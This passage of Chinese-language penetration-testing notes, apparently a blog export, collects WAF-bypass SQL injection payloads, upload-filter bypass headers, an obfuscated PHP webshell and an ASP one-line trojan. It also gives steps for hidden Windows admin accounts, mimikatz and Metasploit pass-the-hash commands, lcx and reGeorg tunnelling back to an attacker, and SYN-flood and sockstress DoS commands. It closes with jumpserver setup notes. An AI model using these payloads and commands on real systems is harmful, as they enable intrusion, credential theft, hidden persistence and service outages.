1’/**/%26%261%3d2%23<br>判断列数： 1’ order by 2%23  </p><p>关联查询爆出用户和数据库：<code>1%27%20union/*%00*//*!50010select*/(database/**/()),(user/**/())%23</code><br>关联查询爆出数据表： <code>%27%20union/*%00*//*!50010select*/((group_concat(table_name))),null/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())%23</code><br>关联查询爆出字段值： <code>%27%20union/*%00*//*!50010select*/((group_concat(COLUMN_NAME))),null/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27%23</code><br>关联查询提取数据： <code>%27%20union/*%00*//*!50010select*/((group_concat(first_name))),null/**/from/**/((users))%23</code><br>盲注爆出数据库：<code>1&#39; and substr(database/**/(),1,1)%3d&#39;1&#39;%23</code><br>盲注爆出数据表： <code>1&#39;/*%00*/and substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1)%3d&#39;1&#39;%23</code><br>盲注爆出字段值： <code>1&#39;/*%00*/and substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1)%3d&#39;1&#39;%23</code><br>盲注提取数据： <code>1&#39;/*%00*/and substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1)%3d&#39;1&#39;%23</code><br>基于时间的盲注爆出数据库： </p><blockquote><p>1’/<em>%00</em>/and (select case when (substr(database/<strong>/(),1,1) like ‘d’) then sleep/</strong>/(3) else 0 end)%23  </p></blockquote><p>基于时间的盲注爆出数据表： <code>1&#39;/*%00*/and (select case when (substr((/*!50010select*/((group_concat(table_name)))/**/from/**/((information_schema.TABLES))/**/where/**/TABLE_SCHEMA%3d(database/**/())),1,1) like &#39;d&#39;) then sleep/**/(3) else 0 end)%23</code><br>基于时间的盲注爆出字段值： <code>1&#39;/*%00*/and (select case when (substr((/*!50010select*/((group_concat(COLUMN_NAME)))/**/from/**/((information_schema.columns))/**/where/**/TABLE_NAME%3d%27users%27),1,1) like &#39;d&#39;) then sleep/**/(3) else 0 end)%23</code><br>基于时间的盲注提取数据： <code>1&#39;/*%00*/and (select case when (substr((/*!50010select*/((group_concat(first_name)))/**/from/**/((users))),1,1) like &#39;d&#39;) then sleep/**/(3) else 0 end)%23</code></p><p>也可以通过以下方法绕过<br>Union -&gt; /<em>!Union/</em>/<strong>/<br>Select -&gt; /<em>!/</em>!Select<em>/<br>Database() -&gt; /</em>!database/*/</strong>//<em>!/</em>!()*/<br>使用这种方法SQL语句依然可以正确执行，而且会完美过狗！<br>但是这里比较坑的一点是安全狗3.5版本会拦截关键字information_schema，这样利用起来就比较麻烦了，不过私神还是提供了一种方法绕过：<br>当mysql版本&gt;=5.6时，可以用如下语句代替：<br>Select table_name from mysql.innodb_table_stats where database_name = database();  </p><h3 id="waf文件上传漏洞"><a href="#waf文件上传漏洞" class="headerlink" title="waf文件上传漏洞"></a>waf文件上传漏洞</h3><p>1.突破0，文件名前缀加[0x09]绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=”[0x09]backlion.asp”</code><br>2.突破1，文件名去掉双引号绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=backlion.asp</code><br>3.突破2，添加一个filename1的文件名参数，并赋值绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=”backlion.asp”;filename1=”test.jpg”</code><br>4.突破3， form变量改成f+orm组合绕过：<code>Content-Disposition: f+orm-data; name=”filepath”;filename=”backlion.asp”</code><br>5.突破4 ，文件名后缀大小写绕过：<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.Asp”</code><br>6.突破5 ，去掉form-data变量绕过：<code>ConTent-Disposition: name=”filepath”; filename=”backlion.asp”</code><br>7.突破6，在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过：    <code>ConTent-Disposition: form-data ; name=”filepath”; filename=”backlion.asp”</code><br>8.<code>ConTentDisposition: form-data ; name=”filepath”; filename=”baclion.asp”</code><br>9.突破7 ，backlion.asp . (空格+.)绕过：<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp .”</code><br>10.突破8 ，“回车换行，绕过：   <code>ConTent-Disposition: form-data; name=”filepath”; filename</code><br>    <code>=”backlion.asp”</code><br>11.突破9 ，NTFS流 在文件名后加::$DATA绕过：<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA”</code><br>12.<code>ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA\0x00\fuck.asp0x00.jpg”</code><br>13.突破10， 经过对IIS 6.0的测试发现，其总是采用第一个（也就是双文件上传）Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传backlion.asp成功]：</p><pre><code>&gt; Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”&gt; —————————–15377259221471&gt; Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.txt”&gt; Content-Type: application/octet-stream&gt; Content-Disposition: form-data; name=”FileUploadName”; filename=”backlion.asp”&gt; Content-Disposition: form-data;&gt; name=”FileUploadName”; filename=”backlion.asp”  </code></pre><p>14.突破11，将Content-Type和ConTent-Disposition调换顺序位置绕过：  </p><pre><code>&gt; Content-Type: text/html&gt; ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”</code></pre><p>15.突破12，在文件名前缀加空格（tab键可替换）绕过：<code>Content-Disposition: form-data; name=”filepath”; filename=    “backlion.asp”</code><br>16.突破13，在form-data加空格绕过：<code>Content-Disposition: form-data;      name=”uploaded”; filename=”backlion.asp”</code><br>17.突破14，在form-data的前后加上+绕过：<code>Content-Disposition: +form-data; name=”filepath”; filename=”backlion.asp”</code><br>18.<code>Content-Disposition: form-data+; name=”filepath”; filename=”backlion.asp”</code>  </p><h3 id="Waf木马检测绕过"><a href="#Waf木马检测绕过" class="headerlink" title="Waf木马检测绕过"></a>Waf木马检测绕过</h3><p>对于使用php写的木马，waf安全狗通常是去检测php文件中是否含有一些敏感的函数，如果有则进行截杀。所以我们写php木马的时候需要巧妙构造php代码，进而绕过安全狗。 </p><pre><code>&gt; &lt;?php &gt; $mt=&quot;JF9QT1N&quot;; //文件路径&gt; $ojj=&quot;QGV2YWwo&quot;;//文件路径&gt; $hsa=&quot;UWydpMGle&quot;;//文件路径&gt; $fnx=&quot;5BeSleleddKTs=&quot;;//文件路径&gt; $zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;); //用空替换为后面变量的所有d字母，替换后为$zk=str_replace。&gt; $ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;); //同理，$ef=base64_decode;&gt; $dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;); //同理,$dva=create_function;&gt; $zvm = $dva(&#39;&#39;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx))); //$zvm=create_function(&#39;&#39;,base64_decode(strplace(...)));&gt; $zvm(); //执行zvm函数。&gt; ?&gt;&gt; &lt;?</code></pre><h3 id="一句话木马编写"><a href="#一句话木马编写" class="headerlink" title="一句话木马编写"></a>一句话木马编写</h3><pre><code>客户端：  &lt;form action=http://192.168.0.2/2.asp method=post&gt;//&quot;action=&quot;后面是需要修改的以asp命名的数据库的提交地址,&lt;textarea name=value cols=120 rows=10 width=45//这里的value值根据服务端&lt;%execute request(&quot;value&quot;)%&gt;中value而设定,可以自行修改成&lt;%execute request(&quot;p&quot;)%&gt;相应这里的value值也必须改为pset lP=server.CreateObject(&quot;Adodb.Stream&quot;) //建立流对象，有了对象才可以使用它固有的属性和方法 lP.Open //建立流对象，有了对象才可以使用它固有的属性和方法 lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;p&quot;) //取得木马内容 参数joeving可以自己定义 但必须和下面的name=joeving相对应lP.SaveToFile server.mappath(&quot;ok.asp&quot;),2 //将木马内容以覆盖文件的方式写入ok.asp，2就是已覆盖的方式，这里的ok.asp也是可以自己定义的，如定义成1.asp，但和下面的response.redirect&quot;ok.asp&quot;中ok.asp的保持一致lP.Close //释放对象set lP=nothing response.redirect &quot;ok.asp&quot;  //转向生成的ok.asp 和上面的ok.asp相对应，也就是你熟悉的asp木马登 陆界面&lt;/textarea&lt;textarea name=p cols=120 rows=10 width=45&gt;这填马的代码&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br&lt;input type=submit value=提交&gt;&lt;/textarea&gt;服务端： &quot;&lt;%execute request(&quot;l&quot;)%&gt;//这段程序的功能：利用插入到数据库文件的&lt;%execute request(&quot;value&quot;)%&gt;这段代码执行第一个textarea中的内容，并将添加的木马内容写入和指向ok.asp，这样就相当于在服务器上建立了个ok.asp木马文件，这样就可以取得webshell了</code></pre><h3 id="使用waf创建账号"><a href="#使用waf创建账号" class="headerlink" title="使用waf创建账号"></a>使用waf创建账号</h3><p>二、建立隐藏帐号</p><p>1、CMD命令行下，建立一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。<br>PS:CMD命令行使用”net user”,看不到”test$”这个账号，因为后面加了一个$符号，所以使用cmd是查看不了的。但是在控制面板和本地用户和组是可以查看的。为了防止管理员能够查看到，解决方法如下：<br>2、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。<br>3、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。<br>4、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。<br>5、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del  （以上操作可以在攻击者自己的电脑上导出创建账号的文件）<br>6、将刚才导出的两个后缀为.reg的注册表项导入注册表中（点击）。这样所谓的隐藏账户就创建好了。这样创建的账号只能在注册表中可以查看，通过cmd命令或者用户分组是查看不了的。<br>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号，如果查不出来，可以克隆中间件帐号  </p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后攻击者就可以<strong>使用浏览器来访问</strong>asp或者php后门，也可以使用连接工具进行访问(例如中国菜刀)得到一个命令执行环境，在该环境中可以进行操作服务器等各种攻击，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。<br>小马：只包含文件上传功能<br>大马：包含的功能更加全面<br>一句话木马：一般只是一句话。<br>拿webshall方法：<br>1.cms获取webshell，cms是一种网站搭建模板，可以方便的搭建一个网站，在谷歌浏览器中使用wappalyzer查看网站的cms，然后根据cms版本查询百度获取该cms的方法。<br>2.非cms获取webshell，表示该公司网站是自己写的，不是使用的模板。<br>1）数据库备份获取webshell，在打开数据库文件，插入一句话木马，然后进行备份即可获取webshell进行连接。<br>2）抓包上传获取webshell<br>3）sql命令获取webshell，可以执行Select ‘<? php eval($_POST[pass]);?>‘ into outfile ‘c:/wwwtest/eval.php’这条命令，表示查询<? php eval($_POST[pass]);?>，将该语句写入到eval.php文件然后将该文件保存到路径下，后面即可进行连接。<br>4）模块修改获取webshell，在后台模块中直接新建木马文件，进行连接。<br>5）插入一句话获取webshell<br>6）修改上传类型获取webshell<br>参考：<a href="http://gstarwd.iteye.com/blog/542376" target="_blank" rel="noopener">http://gstarwd.iteye.com/blog/542376</a><br><a href="http://www.t00ts.net/post-121.html" target="_blank" rel="noopener">http://www.t00ts.net/post-121.html</a><br><a href="http://www.2cto.com/Article/201306/221832.html" target="_blank" rel="noopener">http://www.2cto.com/Article/201306/221832.html</a> 中间件拿Webshell方法总结</p><h2 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h2><p>如果拿到webshell之后发现不能执行cmd命令，原因是因为管理员对cmd进行了防御，此时我们使用中国菜刀上传一个cmd文件即可。<br><strong>获取管理员密码</strong><br>1.使用mimikatz工具获取管理员密码，第一条：privilege::debug  //提升权限 第二条：sekurlsa::logonpa<br>ssWords  //抓取密码<br>2.如果获取到的是hash加密的密码：利用Hash远程登录系统，主要通过MSF提供的exploit/windows/smb/psexec<br>模块来完成。</p><pre><code>&gt; msf &gt;use exploit/windows/smb/psexec //使用该漏洞&gt; msf &gt;set RHOST 192.168.1.109//设置主机&gt; msf &gt;set SMBUser administrator//设置登录账户&gt; msf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4//设置登录密码，改密码是破解出来的密码，但是是加密的，可是直接使用加密密码登录。&gt; msf &gt;exploit//攻击&gt; msf &gt;shell//提权</code></pre><p><strong>获取mysql账号密码</strong><br>1.查看conn,config,data,common,inc等配置文件<br>2.查看mysql文件，/data/mysql/user.myd和user.myi<br>3.通过暴力破解hscan，bruter，hydra，脚本木马等。（这种方法需要数据库可以远程连接，否则不可用）</p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>工具:mysql综合利用工具pax.mac<br>寻址地址：C:/php/MySQL-5.1.50/lib/plugin/udf.dll  </p><h3 id="公网到内网攻击"><a href="#公网到内网攻击" class="headerlink" title="公网到内网攻击"></a>公网到内网攻击</h3><p>服务器处于内网，通过lcx.exe进行攻击。在获取到webshell之后，找到lcx路径下执行lcx.exe-slave + 攻击者公网ip+2222+127.0.0.1+3389表示将自己的3389端口映射到公网的2222端口上（让内网来连接攻击者），其中127.0.0.1是因为此时webshell处于服务器中，它执行本地就是执行被攻击者的电脑。<br>在攻击者电脑中执行lcx.exe-listen 2222 4444将监听2222端口的流量转发到4444端口。<br>然后使用远程连接输入127.0.0.1：4444即可进行远程连接服务器。  </p><h3 id="内网到内网攻击"><a href="#内网到内网攻击" class="headerlink" title="内网到内网攻击"></a>内网到内网攻击</h3><p>使用reduhGUI工具<br>原理：获取到webshell之后，将reduh下的webshell上传到服务器，用的jsp环境就上传jsp文件，用的php环境就上传php文件，redun和lcx类似都是将内网端口映射到本机，不同的是reduh不需要本地ip具有外网ip<br>参考<a href="http://www.redicecn.com/html/wangluoanquan/20110612/307.html" target="_blank" rel="noopener">http://www.redicecn.com/html/wangluoanquan/20110612/307.html</a><br>另一种工具regeorg+proxifier这两种工具的作用结果与reduh相同。将对应的webshell上传到服务器，执行脚本reGeorgSocksProxy.py -p 9999 -u <a href="http://192.168.80.139/zvuldrill/tunnel.nosocket.php。设置代理" target="_blank" rel="noopener">http://192.168.80.139/zvuldrill/tunnel.nosocket.php。设置代理</a><br>参考<a href="https://www.fujieace.com/penetration-test/regeorg-proxifier.html教程" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/regeorg-proxifier.html教程</a>  </p><h2 id="第三方提权"><a href="#第三方提权" class="headerlink" title="第三方提权"></a>第三方提权</h2><h3 id="server-u提权"><a href="#server-u提权" class="headerlink" title="server-u提权"></a>server-u提权</h3><p><a href="https://blog.csdn.net/God_XiangYu/article/details/99692269" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99692269</a>  </p><h3 id="FlashFXP提权"><a href="#FlashFXP提权" class="headerlink" title="FlashFXP提权"></a>FlashFXP提权</h3><p>注意如果密码显示型号，我们可以使用星号密码采摘器进行破解。</p><h3 id="gene6FTP提权"><a href="#gene6FTP提权" class="headerlink" title="gene6FTP提权"></a>gene6FTP提权</h3><h3 id="VNC提权"><a href="#VNC提权" class="headerlink" title="VNC提权"></a>VNC提权</h3><h3 id="radmin提权"><a href="#radmin提权" class="headerlink" title="radmin提权"></a>radmin提权</h3><h3 id="zend提权"><a href="#zend提权" class="headerlink" title="zend提权"></a>zend提权</h3><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><h3 id="windows空格，服务漏洞提权"><a href="#windows空格，服务漏洞提权" class="headerlink" title="windows空格，服务漏洞提权"></a>windows空格，服务漏洞提权</h3><h3 id="perl与cals提权"><a href="#perl与cals提权" class="headerlink" title="perl与cals提权"></a>perl与cals提权</h3><h2 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h2><p>DoS 不是DOS，全拼：Denial of Service，拒绝服务攻击，原理，在进行三次握手过程中，攻击者发送数据包，接收者回发数据包，此时结束了，攻击者不再发送数据包，导致接收者一直在等待确认包，在这个过程中，攻击者不断发送请求包，导致网络拥堵完成攻击。<br>使用kali发起攻击：脚本：syn-flood.py<br>执行python syn-flood.py 192.168.0.45 3389 命令进行攻击。此时执行该命令是无法完成该攻击的，因为每次攻击机进行访问的时候，被攻击者会自动执行rst拒绝访问，因此需要再攻击上执行-iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.0.45 -j DROP这个命令，去关闭rst拒绝服务。<br>在windows中使用FastSend工具进行DDoS攻击  </p><h3 id="Ip地址欺骗"><a href="#Ip地址欺骗" class="headerlink" title="Ip地址欺骗"></a>Ip地址欺骗</h3><p>已经过时，路由器直接过滤掉假的ip地址，不让其发送数据包。  </p><h3 id="smurf攻击"><a href="#smurf攻击" class="headerlink" title="smurf攻击"></a>smurf攻击</h3><p>已经过时</p><h3 id="socketStress攻击"><a href="#socketStress攻击" class="headerlink" title="socketStress攻击"></a>socketStress攻击</h3><p>消耗被攻击目标系统资源 -与攻击目标建立大量socket链接<br>-完成三次握手，最后的ACK包window大小为0 (客户端不接收数据) -攻击者资源消耗小（CPU、内存、带宽）<br>-异步攻击，单机可拒绝服务高配资源服务器<br>攻击脚本sicjstress.py<br>攻击命令 sockstress 192.168.0.45:80 eth0或者sockstress 192.168.0.45:80 eth0 -p payloads/http</p><h2 id="跳板机"><a href="#跳板机" class="headerlink" title="跳板机"></a>跳板机</h2><p>作用：1.进行操作系统权限集中管理，可以对所有服务器中用户的权限进行分配，而不需要每台进行分配。<br>2.网络安全访问控制限制<br>3.记录管理人员的操作行为<br>安装之前环境准备:<br>a.下载软件优化：centos6执行wget -O /etc/yum.repos.d/CentOS-Base.repo <a href="https://mirrors.aliyun.com/repo/Centos-6.repo和wget" target="_blank" rel="noopener">https://mirrors.aliyun.com/repo/Centos-6.repo和wget</a> -O /etc/yum.repos.d/epel.repo <a href="http://mirrors.aliyun.com/repo/epel-6.repo两个命令进行优化" target="_blank" rel="noopener">http://mirrors.aliyun.com/repo/epel-6.repo两个命令进行优化</a><br>b.网络安全优化：<br>aa）关闭防火墙，执行 /etc/init.d/iptables stop 判断是否关闭/etc/init.d/iptables status，这种方式重启后仍然开启，永久关闭方法chkconfig iptables off<br>bb）关闭selinux，它的作用是限制root用户<br>执行setenforce 0，永久关闭方法：vim /etc/selinux/config 打开配置文件将SELINUX改为disable<br>c.开始安装依赖软件：yum -y install git python-pip mysql-devel gcc automake autoconf python-devel vim sshpass lrzsz readline-devel<br>安装跳板机：cd /opt 进入该目录执行，git clone <a href="https://git.coding.net/jumpserver/jumpserver.git" target="_blank" rel="noopener">https://git.coding.net/jumpserver/jumpserver.git</a><br>d.排错：以下都是在opt/install文件夹下进行 1）优化python排错下载；mkdir ~/.pip ,vim ~/.pip/pip.conf,在该文件中添加<br>[global]<br>index-url = <a href="https://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="noopener">https://mirrors.aliyun.com/pypi/simple/</a><br>[install]<br>trusted-host=mirrors.aliyun.com<br>2）卸载不兼容的软件：</p><pre><code>&gt; pip uninstall pycrypto &gt; rm -rf /usr/lib64/python2.6/site-packages/Crypto/&gt; rm -rf  /usr/lib64/python2.6/site-packages/pycrypto-2.6.1-py2.6-linux-x86_64.egg（大部分不执行这条就能解决）&gt; pip install pycrypto==2.4.1</code></pre><p>e。开始安装：pip install -r requirements.txt安装完之后执行，python install.py</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
